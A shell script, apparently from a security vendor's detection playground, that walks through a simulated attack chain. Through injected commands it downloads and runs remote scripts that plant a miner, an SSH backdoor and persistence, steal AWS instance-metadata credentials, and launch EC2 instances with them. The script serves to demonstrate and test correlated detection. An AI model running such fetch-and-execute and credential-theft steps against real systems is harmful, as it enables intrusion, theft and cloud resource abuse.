#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation - Correlated Attack\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates a sophisticated multi-stage attack that \
combines workload compromise with cloud credential theft and abuse. The attack \
exploits a command injection vulnerability to download malware, establish \
persistence, steal AWS credentials from the Instance Metadata Service, and \
then use those credentials to attempt launching expensive EC2 instances. This \
showcases how attackers pivot from workload compromise to cloud infrastructure \
abuse, demonstrating the importance of correlated security monitoring.\033[0m

\033[1;33mThe malware used in this simulation is FAKE and HARMLESS.\033[0m
EOF

step <<EOF
\033[1;35mTool Installation - Install Network Utilities\033[0m

${PURPLE}First, we need to ensure curl is available on the target system for \
downloading our payloads. We'll update the package manager and install curl \
which will be used throughout the attack chain.\033[0m
EOF
wait_for_confirmation
inject "apt update && apt install -y curl"

step <<EOF
\033[1;35mPayload Download - Retrieve Malware with Persistence Script\033[0m

${PURPLE}Now we download the main payload script that contains the malware \
deployment logic. This script will download a simulated cryptocurrency miner, \
establish SSH backdoor persistence, modify system boot scripts, and steal AWS \
credentials from the Instance Metadata Service.\033[0m
EOF
wait_for_confirmation
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/correlation/payload.sh"

step <<EOF
\033[1;35mMake Payload Executable\033[0m

${PURPLE}Set execution permissions on the downloaded payload script so it can \
be executed in the next step.\033[0m
EOF
wait_for_confirmation
inject "chmod +x payload.sh"

step <<EOF
\033[1;35mExecute Main Payload - Deploy Malware and Steal Credentials\033[0m

${PURPLE}Execute the payload script which will: download the simulated mining \
malware, create an SSH backdoor, establish boot persistence, launch the miner, \
and steal AWS IAM credentials from the Instance Metadata Service. The stolen \
credentials will be displayed and used in subsequent steps.\033[0m
EOF
wait_for_confirmation
inject "./payload.sh"

step <<EOF
\033[1;35mDownload Cloud Access Script\033[0m

${PURPLE}Download a script that will abuse the stolen AWS credentials to \
attempt launching expensive EC2 instances across multiple regions. This \
demonstrates how attackers pivot from workload compromise to cloud resource \
abuse.\033[0m
EOF
wait_for_confirmation
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/correlation/cloud-access.sh"

step <<EOF
\033[1;35mMake Cloud Access Script Executable\033[0m

${PURPLE}Set execution permissions on the cloud access script.\033[0m
EOF
wait_for_confirmation
inject "chmod +x cloud-access.sh"

print <<EOF
\033[1;36m──────────────────────────────────────────────────────────────\033[0m
${YELLOW}⚠️  ACTION REQUIRED: Provide AWS Credentials ⚠️\033[0m
\033[1;36m──────────────────────────────────────────────────────────────\033[0m

${PURPLE}The next step will use the cloud-access.sh script to attempt launching \
EC2 instances with stolen credentials. You can use:\033[0m

${WHITE}Option 1: Credentials stolen from IMDS (from payload.sh output above)
Option 2: Your own test AWS credentials\033[0m

${PURPLE}Note: The script will attempt to launch m5.xlarge instances in us-east-1 \
and us-west-2, but will likely fail due to invalid AMI IDs. The goal is to \
generate CloudTrail events showing the unauthorized API activity.\033[0m

EOF

# Prompt for AWS credentials
echo ""
echo -n "${YELLOW}Enter AWS Access Key ID: ${NC}"
read -r AWS_ACCESS_KEY_ID
echo ""
echo -n "${YELLOW}Enter AWS Secret Access Key: ${NC}"
read -r AWS_SECRET_ACCESS_KEY
echo -n "${YELLOW}Enter AWS Session Token: ${NC}"
read -r AWS_SESSION_TOKEN
echo ""

step <<EOF
\033[1;35mCloud Resource Abuse - Attempt EC2 Instance Launch\033[0m

${PURPLE}Now we execute the cloud-access script with the provided AWS credentials. \
The script will attempt to launch expensive EC2 instances across multiple regions, \
generating CloudTrail events that demonstrate cloud resource abuse stemming from \
the workload compromise.\033[0m
EOF
wait_for_confirmation
inject "./cloud-access.sh $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_SESSION_TOKEN"

print <<EOF
${GREEN}Demonstration simulation completed successfully!\033[0m
EOF
